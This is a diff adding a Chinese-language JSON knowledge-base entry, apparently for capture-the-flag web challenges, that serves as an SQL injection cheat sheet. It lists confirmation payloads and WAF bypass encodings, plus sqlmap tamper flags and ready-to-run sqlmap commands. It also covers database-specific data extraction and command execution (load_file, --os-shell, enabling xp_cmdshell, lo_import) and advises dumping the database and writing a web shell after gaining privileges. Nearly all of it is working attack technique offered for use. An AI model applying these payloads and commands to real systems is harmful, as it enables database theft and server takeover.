@@ -1,0 +1,16 @@
+{
+  "id": "kb002",
+  "title": "SQL 注入 — 确认、绕过与提数据",
+  "description": "手工确认优先，waf 绕过空间变换，分库提数据",
+  "detail": "确认：id=1' / 1 and 1=1 vs 1=2 / sleep(3) 时间盲。\n绕过：大小写混合、注释分割 /*!50000select*/、空格→+/**/%0a、双写 selselectect。\nsqlmap：--tamper=space2comment,between（组合试）、--random-agent、--delay 防崩。\n提数据：\n- MySQL: union 或报错 updatexml；读文件 load_file('/flag')；--os-shell 需 secure_file_priv 允许\n- MSSQL: xp_cmdshell（EXEC sp_configure 开启）\n- PgSQL: copy to / lo_import；XML 外带\n- SQLite: sqlite_master 查表名\n高权限后：读 flag 文件 > 脱库 > 写 shell（路径从中间件配置拿）。",
+  "commands": [
+    "sqlmap -u 'http://T/?id=1' --batch --dbs --tamper=space2comment",
+    "sqlmap -r req.txt --level 5 --risk 3 --threads 4"
+  ],
+  "tags": [
+    "web",
+    "sqli"
+  ],
+  "source": "经验/sqlmap",
+  "created_at": "2026-10-15T13:44:05Z"
+}
